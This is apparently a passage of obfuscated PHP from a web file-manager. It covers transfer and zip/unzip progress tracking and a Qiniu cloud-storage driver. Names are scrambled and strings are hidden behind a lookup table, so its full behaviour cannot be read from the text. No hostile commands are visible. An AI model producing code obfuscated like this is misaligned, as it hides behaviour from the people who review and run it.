$_SERVER[ÍÓÖ€°å]; $D»µ½•ìà =& $this->task; $D»µ½•ìà[$f¡Çö¹…‘Ì[1103]] = $D»µ½•ìà[$f¡Çö¹…‘Ì[1102]]; $D»µ½•ìà[$f¡Çö¹…‘Ì[1107]] += $D»µ½•ìà[$f¡Çö¹…‘Ì[1102]]; $D»µ½•ìà[$f¡Çö¹…‘Ì[1104]] = $f¡Çö¹…‘Ì[33]; $this->update(1); } public function updateFileEnd($DÚ—öö°£Ô, $FŠ‚ìœò†) { $FÈ“˜ÉÜÇÑ =& $_SERVER[ÍÓÖ€°å]; $Fõ¶ùĞêö¢ =& $this->task; $Fõ¶ùĞêö¢[$FÈ“˜ÉÜÇÑ[1100]] = $DÚ—öö°£Ô; $Fõ¶ùĞêö¢[$FÈ“˜ÉÜÇÑ[1102]] = $FŠ‚ìœò†; $Fõ¶ùĞêö¢[$FÈ“˜ÉÜÇÑ[1107]] += $FŠ‚ìœò†; $this->update(1); } public function curlProgress($aªŒçÌ·, $a‡ËÑ¯ˆô´, $e è©„¦¹‰, $eßØ¤†«†³, $D¡‹ŞÜ…) { $dÃöö‚´… =& $_SERVER[ÍÓÖ€°å]; $c‚éˆÉôŒ¥ =& $this->task; if ($D¡‹ŞÜ… > 0) { $c‚éˆÉôŒ¥[$dÃöö‚´…[1063]] = $dÃöö‚´…[1111]; $c‚éˆÉôŒ¥[$dÃöö‚´…[1104]] = $dÃöö‚´…[126]; if ($c‚éˆÉôŒ¥[$dÃöö‚´…[1102]] == $eßØ¤†«†³ || $eßØ¤†«†³ > 1024 * 1024) { $c‚éˆÉôŒ¥[$dÃöö‚´…[1103]] = $D¡‹ŞÜ…; } if ($c‚éˆÉôŒ¥[$dÃöö‚´…[1105]]) { $c‚éˆÉôŒ¥[$dÃöö‚´…[1103]] = $D¡‹ŞÜ… + $c‚éˆÉôŒ¥[$dÃöö‚´…[1105]]; } } else { if ($e è©„¦¹‰ > 0) { if ($c‚éˆÉôŒ¥[$dÃöö‚´…[1102]] == $a‡ËÑ¯ˆô´) { $c‚éˆÉôŒ¥[$dÃöö‚´…[1103]] = $e è©„¦¹‰; $c‚éˆÉôŒ¥[$dÃöö‚´…[1063]] = $dÃöö‚´…[1112]; $c‚éˆÉôŒ¥[$dÃöö‚´…[1104]] = $dÃöö‚´…[765]; } } } $this->update(); } public function curlProgressStart($Dãğ‰çğç©) { } public function curlProgressEnd($CÆâ‰éˆË¡) { $D³ö±ê =& $_SERVER[ÍÓÖ€°å]; $FêàåâéÉç =& $this->task; $cñïÉœ´× = curl_getinfo($CÆâ‰éˆË¡); $Fš™ÑËëŞÆ = $cñïÉœ´×[$D³ö±ê[1113]]; if ($FêàåâéÉç[$D³ö±ê[1104]] == $D³ö±ê[126] && $Fš™ÑËëŞÆ) { $FêàåâéÉç[$D³ö±ê[1105]] += $Fš™ÑËëŞÆ; } $this->update(); } } goto eÇ¦½„—ÍÇ; eÇ¦½„—ÍÇ: class TaskHttp extends Task { protected function startAfter() { $Eà³¿ÁœÉª =& $_SERVER[ÍÓÖ€°å]; $D’™ÑŞòé =& $this->task; Hook::bind($Eà³¿ÁœÉª[1096], array($this, $Eà³¿ÁœÉª[1114])); Hook::bind($Eà³¿ÁœÉª[1094], array($this, $Eà³¿ÁœÉª[1115])); Hook::bind($Eà³¿ÁœÉª[1098], array($this, $Eà³¿ÁœÉª[1116])); } protected function endAfter() { $AòĞ‡¹Ü† =& $_SERVER[ÍÓÖ€°å]; Hook::unbind($AòĞ‡¹Ü†[1096], array($this, $AòĞ‡¹Ü†[1114])); } public function progressStart($D£§šî¿æÏ) { $D³°½¾±Í =& $_SERVER[ÍÓÖ€°å]; $D¡•±á¶Ùß = curl_getinfo($D£§šî¿æÏ); self::log($D³°½¾±Í[1117] . $D¡•±á¶Ùß[$D³°½¾±Í[287]]); self::valueSet($this->task[$D³°½¾±Í[357]], $this->task); } public function progressEnd($fÒ›óËßŒ) { $fÙ‰¥ªù·Á =& $_SERVER[ÍÓÖ€°å]; self::log($fÙ‰¥ªù·Á[1118] . $this->task[$fÙ‰¥ªù·Á[357]]); $this->end(); } public function progress($fóÅÜÈÃÍ®, $fòê›Ô³…Î, $CˆëÓ•’Î­, $a¼À¸¹÷‘ê, $bÚìÉĞº¡) { $d†äˆßÊœ‹ =& $_SERVER[ÍÓÖ€°å]; $CĞÉ®ÌöÔÇ =& $this->task; if ($bÚìÉĞº¡ > 0) { $CĞÉ®ÌöÔÇ[$d†äˆßÊœ‹[1064]] = $CĞÉ®ÌöÔÇ[$d†äˆßÊœ‹[1064]] == 0 ? $a¼À¸¹÷‘ê : $CĞÉ®ÌöÔÇ[$d†äˆßÊœ‹[1064]]; $CĞÉ®ÌöÔÇ[$d†äˆßÊœ‹[1065]] = $bÚìÉĞº¡; } else { if ($CˆëÓ•’Î­ > 0) { $CĞÉ®ÌöÔÇ[$d†äˆßÊœ‹[1064]] = $CĞÉ®ÌöÔÇ[$d†äˆßÊœ‹[1064]] == 0 ? $fòê›Ô³…Î : $CĞÉ®ÌöÔÇ[$d†äˆßÊœ‹[1064]]; $CĞÉ®ÌöÔÇ[$d†äˆßÊœ‹[1065]] = $CˆëÓ•’Î­; } } $this->update(); self::log("\160\x72\157\147\x72\145\x73\x73\x48\164\164\x70\72\144\x6f\167\x6e\72{$CˆëÓ•’Î­}\57{$fòê›Ô³…Î}\x3b\x20\x75\160\154\157\141\144\x3a{$bÚìÉĞº¡}\57{$a¼À¸¹÷‘ê}\x3b"); } } class TaskUnzip extends TaskFileTransfer { protected function startAfter() { goto c•Àªß§äã; F‹× Š­ó: if (!$BĞÜÖéè»´[$AÚ¿ªˆí[968]]) { $BĞÜÖéè»´[$AÚ¿ªˆí[968]] = LNG($AÚ¿ªˆí[1123]); } goto Aô˜˜½µ¶Ø; c•Àªß§äã: $AÚ¿ªˆí =& $_SERVER[ÍÓÖ€°å]; parent::startAfter(); Hook::bind($AÚ¿ªˆí[1119], array($this, $AÚ¿ªˆí[1120])); goto E„ÈŞÇ½; E„ÈŞÇ½: Hook::bind($AÚ¿ªˆí[760], array($this, $AÚ¿ªˆí[1121])); $BĞÜÖéè»´ =& $this->task; $BĞÜÖéè»´[$AÚ¿ªˆí[1122]] = $AÚ¿ªˆí[765]; goto F‹× Š­ó; Aô˜˜½µ¶Ø: } protected function endAfter() { $fØ½§ŒÍ¬ =& $_SERVER[ÍÓÖ€°å]; parent::endAfter(); Hook::unbind($fØ½§ŒÍ¬[1119], array($this, $fØ½§ŒÍ¬[1120])); Hook::unbind($fØ½§ŒÍ¬[760], array($this, $fØ½§ŒÍ¬[1121])); } public function updateAfter() { $BÓ“„İ¾í =& $_SERVER[ÍÓÖ€°å]; $fëÏª²«öø =& $this->task; if (!$fëÏª²«öø[$BÓ“„İ¾í[1064]] || !$fëÏª²«öø[$BÓ“„İ¾í[446]]) { return; } if ($fëÏª²«öø[$BÓ“„İ¾í[1122]] == $BÓ“„İ¾í[765]) { $Aø˜Ÿ²ë‹ = 0; if ($fëÏª²«öø[$BÓ“„İ¾í[1102]]) { $Aø˜Ÿ²ë‹ = $fëÏª²«öø[$BÓ“„İ¾í[1103]] / $fëÏª²«öø[$BÓ“„İ¾í[1102]]; } $fëÏª²«öø[$BÓ“„İ¾í[1066]] = $Aø˜Ÿ²ë‹ * 0.3; } else { if ($fëÏª²«öø[$BÓ“„İ¾í[1122]] == $BÓ“„İ¾í[293]) { $Aø˜Ÿ²ë‹ = $fëÏª²«öø[$BÓ“„İ¾í[1065]] / $fëÏª²«öø[$BÓ“„İ¾í[1064]]; $fëÏª²«öø[$BÓ“„İ¾í[1066]] = 0.3 + $Aø˜Ÿ²ë‹ * 0.4; } else { if ($fëÏª²«öø[$BÓ“„İ¾í[1122]] == $BÓ“„İ¾í[126]) { $Dº¡’©‚’ = 0; if ($fëÏª²«öø[$BÓ“„İ¾í[1104]] == $BÓ“„İ¾í[126]) { $Dº¡’©‚’ = $fëÏª²«öø[$BÓ“„İ¾í[1103]]; } $Aø˜Ÿ²ë‹ = ($fëÏª²«öø[$BÓ“„İ¾í[1107]] + $Dº¡’©‚’) / $fëÏª²«öø[$BÓ“„İ¾í[446]]; $fëÏª²«öø[$BÓ“„İ¾í[1066]] = 0.3 + 0.4 + $Aø˜Ÿ²ë‹ * 0.3; } } } if ($fëÏª²«öø[$BÓ“„İ¾í[1066]] > 0) { $FÍ¼ğ­‰Åá = timeFloat() - $fëÏª²«öø[$BÓ“„İ¾í[1068]] - $fëÏª²«öø[$BÓ“„İ¾í[1071]]; $fëÏª²«öø[$BÓ“„İ¾í[1072]] = $FÍ¼ğ­‰Åá * (1 - $fëÏª²«öø[$BÓ“„İ¾í[1066]]) / $fëÏª²«öø[$BÓ“„İ¾í[1066]]; } } public function addFile($eŞµŞ‹âÒ) { goto a±­ Ñø¥ò; cÂšÌóÑ­: $this->update(); goto C¸Äº›š÷Ø; dÏøê…Ã: $eôË’î ç«[$b‹†¾˜Í‚[1064]] = 1; $eôË’î ç«[$b‹†¾˜Í‚[1108]] = array(); $eôË’î ç«[$b‹†¾˜Í‚[1108]][] = array($b‹†¾˜Í‚[378] => $a‡’Â«áå[$b‹†¾˜Í‚[28]], $b‹†¾˜Í‚[76] => $a‡’Â«áå[$b‹†¾˜Í‚[76]], $b‹†¾˜Í‚[750] => $a‡’Â«áå[$b‹†¾˜Í‚[750]] ? $a‡’Â«áå[$b‹†¾˜Í‚[750]] : $a‡’Â«áå[$b‹†¾˜Í‚[76]]); goto cÂšÌóÑ­; a±­ Ñø¥ò: $b‹†¾˜Í‚ =& $_SERVER[ÍÓÖ€°å]; $eôË’î ç« =& $this->task; $a‡’Â«áå = IO::info($eŞµŞ‹âÒ); goto Dä‡šäó¸; e›¬ÉÕÍ‚‚: $eôË’î ç«[$b‹†¾˜Í‚[1063]] = $b‹†¾˜Í‚[1112]; $eôË’î ç«[$b‹†¾˜Í‚[1104]] = $b‹†¾˜Í‚[765]; $eôË’î ç«[$b‹†¾˜Í‚[446]] = $a‡’Â«áå[$b‹†¾˜Í‚[78]]; goto dÏøê…Ã; Dä‡šäó¸: $eôË’î ç«[$b‹†¾˜Í‚[1100]] = $a‡’Â«áå[$b‹†¾˜Í‚[28]]; $eôË’î ç«[$b‹†¾˜Í‚[1102]] = $a‡’Â«áå[$b‹†¾˜Í‚[78]]; $eôË’î ç«[$b‹†¾˜Í‚[1103]] = 0; goto e›¬ÉÕÍ‚‚; C¸Äº›š÷Ø: } public function unzipAfter($Ağ¢Šõ¿Ğ) { goto AŞÏî‹Õ‘; AœÙãÂ‘ä•: $F‹¨Û†ÎÀô[$a™‡®¦µÊ[1065]] = 0; $F‹¨Û†ÎÀô[$a™‡®¦µÊ[1102]] = 0; $F‹¨Û†ÎÀô[$a™‡®¦µÊ[1103]] = 0; goto F¸Ğ„­Ï”; aÁÉ¯ºà›: $this->update(); self::log($a™‡®¦µÊ[1124] . json_encode(array($F‹¨Û†ÎÀô, $EÊòµÖ¹´µ))); goto fÃ‡ïÎ‰–; F¬›ö·•®´: $EÊòµÖ¹´µ = IO::infoWithChildren($Ağ¢Šõ¿Ğ); $F‹¨Û†ÎÀô[$a™‡®¦µÊ[1108]] = array(); $F‹¨Û†ÎÀô[$a™‡®¦µÊ[1108]][] = array($a™‡®¦µÊ[378] => $EÊòµÖ¹´µ[$a™‡®¦µÊ[28]], $a™‡®¦µÊ[76] => $EÊòµÖ¹´µ[$a™‡®¦µÊ[76]], $a™‡®¦µÊ[750] => $EÊòµÖ¹´µ[$a™‡®¦µÊ[750]] ? $EÊòµÖ¹´µ[$a™‡®¦µÊ[750]] : $EÊòµÖ¹´µ[$a™‡®¦µÊ[76]]); goto e¤…Ô°”‹Ù; AŞÏî‹Õ‘: $a™‡®¦µÊ =& $_SERVER[ÍÓÖ€°å]; $F‹¨Û†ÎÀô =& $this->task; $F‹¨Û†ÎÀô[$a™‡®¦µÊ[1122]] = $a™‡®¦µÊ[126]; goto F¬›ö·•®´; e¤…Ô°”‹Ù: if ($EÊòµÖ¹´µ[$a™‡®¦µÊ[29]] == $a™‡®¦µÊ[155]) { $F‹¨Û†ÎÀô[$a™‡®¦µÊ[1064]] = 1; } else { $F‹¨Û†ÎÀô[$a™‡®¦µÊ[1064]] = $EÊòµÖ¹´µ[$a™‡®¦µÊ[81]][$a™‡®¦µÊ[79]]; } $F‹¨Û†ÎÀô[$a™‡®¦µÊ[1063]] = $a™‡®¦µÊ[33]; $F‹¨Û†ÎÀô[$a™‡®¦µÊ[1104]] = 0; goto AœÙãÂ‘ä•; F¸Ğ„­Ï”: $F‹¨Û†ÎÀô[$a™‡®¦µÊ[1100]] = $a™‡®¦µÊ[33]; $F‹¨Û†ÎÀô[$a™‡®¦µÊ[1107]] = 0; $F‹¨Û†ÎÀô[$a™‡®¦µÊ[446]] = $EÊòµÖ¹´µ[$a™‡®¦µÊ[78]]; goto aÁÉ¯ºà›; fÃ‡ïÎ‰–: } public function nameParse($a‚éµ²èÌ¯) { goto e÷£ğƒ¹Ñê; c˜®¥¢òÌù: $this->update(); goto E¨ºàÂÆÆï; e÷£ğƒ¹Ñê: $fé›¼¢¼Ï =& $_SERVER[ÍÓÖ€°å]; $BÑÒÎô¡Ë¹ =& $this->task; if ($BÑÒÎô¡Ë¹[$fé›¼¢¼Ï[1122]] == $fé›¼¢¼Ï[765]) { $BÑÒÎô¡Ë¹[$fé›¼¢¼Ï[1122]] = $fé›¼¢¼Ï[293]; $BÑÒÎô¡Ë¹[$fé›¼¢¼Ï[1107]] = 0; $BÑÒÎô¡Ë¹[$fé›¼¢¼Ï[446]] = 0; } goto E ôè„‘ë; E ôè„‘ë: $bì‡ÓÄÌ¿Ö = get_path_this($a‚éµ²èÌ¯); if (strstr($bì‡ÓÄÌ¿Ö, $fé›¼¢¼Ï[90])) { $BÑÒÎô¡Ë¹[$fé›¼¢¼Ï[1065]] += 1; $BÑÒÎô¡Ë¹[$fé›¼¢¼Ï[1064]] += 1; } $BÑÒÎô¡Ë¹[$fé›¼¢¼Ï[1100]] = $a‚éµ²èÌ¯; goto c˜®¥¢òÌù; E¨ºàÂÆÆï: } } class TaskZip extends TaskFileTransfer { protected function startAfter() { $c…ƒšíÅ¡ô =& $_SERVER[ÍÓÖ€°å]; parent::startAfter(); Hook::bind($c…ƒšíÅ¡ô[1125], array($this, $c…ƒšíÅ¡ô[1120])); $A„•÷¿ïá =& $this->task; $A„•÷¿ïá[$c…ƒšíÅ¡ô[1122]] = $c…ƒšíÅ¡ô[765]; if (!$A„•÷¿ïá[$c…ƒšíÅ¡ô[968]]) { $A„•÷¿ïá[$c…ƒšíÅ¡ô[968]] = LNG($c…ƒšíÅ¡ô[1126]); } } protected function endAfter() { $a‹†åÍæìØ =& $_SERVER[ÍÓÖ€°å]; parent::endAfter(); Hook::unbind($a‹†åÍæìØ[1125], array($this, $a‹†åÍæìØ[1120])); } public function updateAfter() { $bÂŠÈ‚¿ó„ =& $_SERVER[ÍÓÖ€°å]; $AÇ„àéˆ©Ş =& $this->task; if (!$AÇ„àéˆ©Ş[$bÂŠÈ‚¿ó„[1064]] || !$AÇ„àéˆ©Ş[$bÂŠÈ‚¿ó„[446]]) { return; } if ($AÇ„àéˆ©Ş[$bÂŠÈ‚¿ó„[1122]] == $bÂŠÈ‚¿ó„[765]) { $d„Öø‚¸ö = $AÇ„àéˆ©Ş[$bÂŠÈ‚¿ó„[1103]]; if ($AÇ„àéˆ©Ş[$bÂŠÈ‚¿ó„[1104]] != $bÂŠÈ‚¿ó„[765]) { $d„Öø‚¸ö = 0; } $c¸ù§ØŸ¬Î = ($AÇ„àéˆ©Ş[$bÂŠÈ‚¿ó„[1107]] + $d„Öø‚¸ö) / $AÇ„àéˆ©Ş[$bÂŠÈ‚¿ó„[446]]; $AÇ„àéˆ©Ş[$bÂŠÈ‚¿ó„[1066]] = $c¸ù§ØŸ¬Î * 0.3; } else { if ($AÇ„àéˆ©Ş[$bÂŠÈ‚¿ó„[1122]] == $bÂŠÈ‚¿ó„[293]) { $c¸ù§ØŸ¬Î = $AÇ„àéˆ©Ş[$bÂŠÈ‚¿ó„[1065]] / $AÇ„àéˆ©Ş[$bÂŠÈ‚¿ó„[1064]]; $AÇ„àéˆ©Ş[$bÂŠÈ‚¿ó„[1066]] = 0.3 + $c¸ù§ØŸ¬Î * 0.5; } else { if ($AÇ„àéˆ©Ş[$bÂŠÈ‚¿ó„[1122]] == $bÂŠÈ‚¿ó„[126]) { $c¸ù§ØŸ¬Î = 0; if ($AÇ„àéˆ©Ş[$bÂŠÈ‚¿ó„[1102]]) { $c¸ù§ØŸ¬Î = $AÇ„àéˆ©Ş[$bÂŠÈ‚¿ó„[1103]] / $AÇ„àéˆ©Ş[$bÂŠÈ‚¿ó„[1102]]; } $AÇ„àéˆ©Ş[$bÂŠÈ‚¿ó„[1066]] = 0.3 + 0.5 + $c¸ù§ØŸ¬Î * 0.2; } } } if ($AÇ„àéˆ©Ş[$bÂŠÈ‚¿ó„[1066]] > 0) { $C®ÂÙÛœ‡– = timeFloat() - $AÇ„àéˆ©Ş[$bÂŠÈ‚¿ó„[1068]] - $AÇ„àéˆ©Ş[$bÂŠÈ‚¿ó„[1071]]; $AÇ„àéˆ©Ş[$bÂŠÈ‚¿ó„[1072]] = $C®ÂÙÛœ‡– * (1 - $AÇ„àéˆ©Ş[$bÂŠÈ‚¿ó„[1066]]) / $AÇ„àéˆ©Ş[$bÂŠÈ‚¿ó„[1066]]; } } public function copyFileStart($aˆŸ‡šŒ«ó, $Dæ†¡‰±Ş, $fÔëáèåœ, $A¹ŒÆÄÎøÕ, $dÏàŠãÇ², $dÊÔóŒåÖ„) { $aÎ†ö›÷×¯ =& $_SERVER[ÍÓÖ€°å]; parent::copyFileStart($aˆŸ‡šŒ«ó, $Dæ†¡‰±Ş, $fÔëáèåœ, $A¹ŒÆÄÎøÕ, $dÏàŠãÇ², $dÊÔóŒåÖ„); $Dë‘ÜôøÕ =& $this->task; if ($Dë‘ÜôøÕ[$aÎ†ö›÷×¯[1122]] == $aÎ†ö›÷×¯[293]) { $Dë‘ÜôøÕ[$aÎ†ö›÷×¯[1122]] = $aÎ†ö›÷×¯[126]; } $this->update(); } public function copyFileEnd($CŠ‚‘õ¬…, $B¼é›¿ÏÔ¿, $E‹™ƒ‡‡ç”, $A¥Š‹‚·ÆÍ, $bË§ÍÁé», $eÖí¡¡çâ) { $a£âå´ Èœ =& $_SERVER[ÍÓÖ€°å]; $BÈ÷½óŠÜ =& $this->task; $BÈ÷½óŠÜ[$a£âå´ Èœ[1103]] = $BÈ÷½óŠÜ[$a£âå´ Èœ[1102]]; $BÈ÷½óŠÜ[$a£âå´ Èœ[1107]] += $BÈ÷½óŠÜ[$a£âå´ Èœ[1102]]; $BÈ÷½óŠÜ[$a£âå´ Èœ[1104]] = $a£âå´ Èœ[33]; $this->update(); } public function nameParse($b¯§éŞ‹±) { $d„ÁÂ¯ĞË =& $_SERVER[ÍÓÖ€°å]; $E”“à¤ÔÒÎ =& $this->task; if ($E”“à¤ÔÒÎ[$d„ÁÂ¯ĞË[1065]] < $E”“à¤ÔÒÎ[$d„ÁÂ¯ĞË[1064]]) { $AêÜ¦™Ë § = get_path_this($b¯§éŞ‹±); if (strstr($AêÜ¦™Ë §, $d„ÁÂ¯ĞË[90])) { $E”“à¤ÔÒÎ[$d„ÁÂ¯ĞË[1065]] += 1; } } if ($E”“à¤ÔÒÎ[$d„ÁÂ¯ĞË[1122]] == $d„ÁÂ¯ĞË[765]) { $E”“à¤ÔÒÎ[$d„ÁÂ¯ĞË[1122]] = $d„ÁÂ¯ĞË[293]; } $E”“à¤ÔÒÎ[$d„ÁÂ¯ĞË[1100]] = $b¯§éŞ‹±; $this->update(); } } goto b„ ’áÕ®š; BÎŠ¾ªá™Ä: class PathDriverQiniu extends PathDriverBase { private $accessKey = ''; private $secret = ''; private $domain = ''; private $region = ''; private $bucket = ''; private $auth = null; private $client = null; private $config = null; private $bucketManager = null; public function __construct($D˜±Â˜Ï‹ ) { parent::__construct(); require_once SDK_DIR . $_SERVER[ÍÓÖ€°å][915]; $this->_init($D˜±Â˜Ï‹ ); } private function _init($e–ŠŒòÀ²¦) { foreach ($e–ŠŒòÀ²¦ as $cÌ÷§”‡¶˜ => $C²ï§½È¡İ) { if (isset($this->{$cÌ÷§”‡¶˜})) { $this->{$cÌ÷§”‡¶˜} = $C²ï§½È¡İ; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { show_json($_SERVER[ÍÓÖ€°å][916], !1); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->config = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->config); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($aİÕÚ‹œ¤·, $BŠÍöŸ¨æŒ = '', $E‘‚ï•òÙ“ = REPEAT_RENAME) { if ($this->setContent($aİÕÚ‹œ¤·, $BŠÍöŸ¨æŒ)) { return $this->getPathOuter($aİÕÚ‹œ¤·); } return !1; } public function mkdir($eŞöğÊùĞÑ, $a‰æç¿ù·Ó = REPEAT_SKIP) { goto c™Ø‹‡¤÷Î; Bš‹ÇÊ®¢Ã: $eŞöğÊùĞÑ = $bİğãµö’š . $BÕìí½ÕØ[8]; $aâ‰÷÷Ê„Š = get_path_this($bİğãµö’š); $E¯ÕåŠí‹ = $eŞöğÊùĞÑ . $aâ‰÷÷Ê„Š; goto BÄ¬ù”„Ä; BÄ¬ù”„Ä: if (!$this->mkfile($E¯ÕåŠí‹)) { return !1; } if (!$this->moveFile($E¯ÕåŠí‹, $eŞöğÊùĞÑ)) { $this->delFile($E¯ÕåŠí‹); return !1; } return $this->getPathOuter($bİğãµö’š); goto E£È¹Á¥; c™Ø‹‡¤÷Î: $BÕìí½ÕØ =& $_SERVER[ÍÓÖ€°å]; $bİğãµö’š = trim($eŞöğÊùĞÑ, $BÕìí½ÕØ[8]); if ($this->isFolder($bİğãµö’š)) { return $this->getPathOuter($bİğãµö’š); } goto Bš‹ÇÊ®¢Ã; E£È¹Á¥: } public function copyFile($cŒâ¤ù£‚¥, $AèÖ¿»ÎŸÀ) { $cÇ™í‘†‚¹ = $this->bucketManager->copy($this->bucket, $cŒâ¤ù£‚¥, $this->bucket, $AèÖ¿»ÎŸÀ, !0); return $cÇ™í‘†‚¹ ? !1 : !0; } public function moveFile($Dğê¢œšÕ, $f‰×³îŞ–) { $Dñ‚Šõğ¾ã = $this->bucketManager->move($this->bucket, $Dğê¢œšÕ, $this->bucket, $f‰×³îŞ–, !0); return $Dñ‚Šõğ¾ã ? !1 : !0; } public function delFile($cñˆ£ôÅâÚ) { $C«È¼Õ“ãš = $this->bucketManager->delete($this->bucket, $cñˆ£ôÅâÚ); return $C«È¼Õ“ãš ? !1 : !0; } public function delFolder($AŠÎîäÀç) { $E‹  ³êá = $this->fileList($AŠÎîäÀç); if (empty($E‹  ³êá)) { return !0; } $f†á±„…¶¢ = 1000; if (count($E‹  ³êá) <= $f†á±„…¶¢) { return $this->qnDelObj($E‹  ³êá) ? !1 : !0; } foreach (array_chunk($E‹  ³êá, $f†á±„…¶¢) as $A­Å‡ù§õ) { $B¸¯Ë”ê– = $this->qnDelObj($A­Å‡ù§õ); if ($B¸¯Ë”ê–) { return !1; } } return !0; } private function qnDelObj($dË‡¶ÜÙ÷) { $EÊæÊÄ² = $this->bucketManager->buildBatchDelete($this->bucket, $dË‡¶ÜÙ÷); list($bôÈ“Ü‰¯Ô, $B‰–á“ëãÍ) = $this->bucketManager->batch($EÊæÊÄ²); return $B‰–á“ëãÍ; } private function fileList($cçñõŠÃÄ, $bˆˆ³ åßİ = 0) { goto E¨åßô±Âî; EÓÃä“–½›: $D×ñ†™ğå = array(); while (!0) { list($cñ›Ü½»á, $FğçÓõ½‡) = $this->bucketManager->listFiles($this->bucket, $eàå…ë¬‰, $BÔ²³Ğ„„, $E›©™‰¾ÛÊ, $f‰İ‡×Äí); if ($FğçÓõ½‡) { return !1; } $BÔ²³Ğ„„ = array_key_exists($bœ¤Àç®ä¶[884], $cñ›Ü½»á) ? $BÔ²³Ğ„„ = $cñ›Ü½»á[$bœ¤Àç®ä¶[917]] : $bœ¤Àç®ä¶[33]; foreach ($cñ›Ü½»á[$bœ¤Àç®ä¶[918]] as $cïÛöê„¹) { $A†ÚÂ½Àñ = $cïÛöê„¹[$bœ¤Àç®ä¶[88]]; if ($bˆˆ³ åßİ) { $A†ÚÂ½Àñ = array($bœ¤Àç®ä¶[28] => $A†ÚÂ½Àñ, $bœ¤Àç®ä¶[78] => $cïÛöê„¹[$bœ¤Àç®ä¶[919]]); } $D×ñ†™ğå[] = $A†ÚÂ½Àñ; } if ($BÔ²³Ğ„„ == $bœ¤Àç®ä¶[33]) { break; } } return $D×ñ†™ğå; goto D£¯‹ŞšÁù; B¦‘ªİŠÌÍ: $BÔ²³Ğ„„ = $bœ¤Àç®ä¶[33]; $E›©™‰¾ÛÊ = 1000; $f‰İ‡×Äí = $bœ¤Àç®ä¶[33]; goto EÓÃä“–½›; E¨åßô±Âî: $bœ¤Àç®ä¶ =& $_SERVER[ÍÓÖ€°å]; $cçñõŠÃÄ = trim($cçñõŠÃÄ, $bœ¤Àç®ä¶[8]); $eàå…ë¬‰ = empty($cçñõŠÃÄ) ? $bœ¤Àç®ä¶[33] : $cçñõŠÃÄ . $bœ¤Àç®ä¶[8]; goto B¦‘ªİŠÌÍ; D£¯‹ŞšÁù: } public function rename($bà ÕÍöØ, $fé¦Ø—Òƒ) { return $this->renameObject($bà ÕÍöØ, $fé¦Ø—Òƒ); } public function size($aÁŠ¹ØÈğ§) { $cĞ•ãôÆ¿ =& $_SERVER[ÍÓÖ€°å]; list($fñ”èñ¢½Û, $CéïÔ—«Ñ¬) = $this->bucketManager->stat($this->bucket, trim($aÁŠ¹ØÈğ§, $cĞ•ãôÆ¿[8])); return isset($fñ”èñ¢½Û[$cĞ•ãôÆ¿[919]]) ? $fñ”èñ¢½Û[$cĞ•ãôÆ¿[919]] : 0; } public function info($EÊ½Óù¾ÂÅ) { $EÊ½Óù¾ÂÅ = trim($EÊ½Óù¾ÂÅ, $_SERVER[ÍÓÖ€°å][8]); if ($this->isFolder($EÊ½Óù¾ÂÅ)) { return $this->folderInfo($EÊ½Óù¾ÂÅ, 1); } return $this->fileInfo($EÊ½Óù¾ÂÅ); } public function fileInfo($AÙŠÒè²Ü, $a¹Øòå‘² = array(), $DŠÕ½èö  = false) { goto Dß’Ú”ÉÛ; Dß’Ú”ÉÛ: $Cš†©ò Ñ =& $_SERVER[ÍÓÖ€°å]; if ($DŠÕ½èö ) { return array($Cš†©ò Ñ[28] => $this->pathThis($AÙŠÒè²Ü), $Cš†©ò Ñ[76] => $this->getPathOuter($Cš†©ò Ñ[8] . $AÙŠÒè²Ü), $Cš†©ò Ñ[29] => $Cš†©ò Ñ[155], $Cš†©ò Ñ[78] => isset($a¹Øòå‘²[$Cš†©ò Ñ[919]]) ? $a¹Øòå‘²[$Cš†©ò Ñ[919]] : 0, $Cš†©ò Ñ[148] => $this->ext($AÙŠÒè²Ü)); } $B§Æ˜¯ç»® = array($Cš†©ò Ñ[28] => $this->pathThis($AÙŠÒè²Ü), $Cš†©ò Ñ[76] => $this->getPathOuter($Cš†©ò Ñ[8] . $AÙŠÒè²Ü), $Cš†©ò Ñ[29] => $Cš†©ò Ñ[155], $Cš†©ò Ñ[175] => $Cš†©ò Ñ[50], $Cš†©ò Ñ[101] => $Cš†©ò Ñ[50], $Cš†©ò Ñ[78] => 0, $Cš†©ò Ñ[148] => $this->ext($AÙŠÒè²Ü), $Cš†©ò Ñ[176] => !0, $Cš†©ò Ñ[177] => !0); goto EÒ“Ã³‘ˆ³; EÒ“Ã³‘ˆ³: if (empty($a¹Øòå‘²)) { list($a¹Øòå‘², $Fİ§¯ùèè) = $this->bucketManager->stat($this->bucket, $AÙŠÒè²Ü); if ($Fİ§¯ùèè) { return $B§Æ˜¯ç»®; } $this->fileInfoImage($AÙŠÒè²Ü, $B§Æ˜¯ç»®); } $B§Æ˜¯ç»®[$Cš†©ò Ñ[175]] = substr($a¹Øòå‘²[$Cš†©ò Ñ[920]], 0, -7); $B§Æ˜¯ç»®[$Cš†©ò Ñ[78]] = $a¹Øòå‘²[$Cš†©ò Ñ[919]]; goto B¸ÃŞ¢—•; B¸ÃŞ¢—•: return $B§Æ˜¯ç»®; goto D‡ùİ›¿Á˜; D‡ùİ›¿Á˜: } public function folderInfo($FöÜÇØÒÛê, $B„ÃİšÙ„ = 0, $BÔÉîÈè©ï = false) { $eíš…¦ƒÀµ =& $_SERVER[ÍÓÖ€°å]; if ($BÔÉîÈè©ï) { return array($eíš…¦ƒÀµ[28] => $this->pathThis($FöÜÇØÒÛê), $eíš…¦ƒÀµ[76] => $this->getPathOuter($eíš…¦ƒÀµ[8] . $FöÜÇØÒÛê), $eíš…¦ƒÀµ[29] => $eíš…¦ƒÀµ[77]); } $b‘†ÇöÔÎ· = array($eíš…¦ƒÀµ[28] => $this->pathThis($FöÜÇØÒÛê), $eíš…¦ƒÀµ[76] => $this->getPathOuter($eíš…¦ƒÀµ[8] . $FöÜÇØÒÛê), $eíš…¦ƒÀµ[29] => $eíš…¦ƒÀµ[77], $eíš…¦ƒÀµ[175] => $eíš…¦ƒÀµ[50], $eíš…¦ƒÀµ[101] => $eíš…¦ƒÀµ[50], $eíš…¦ƒÀµ[179] => !1, $eíš…¦ƒÀµ[180] => !1, $eíš…¦ƒÀµ[863] => !0, $eíš…¦ƒÀµ[864] => !0); if 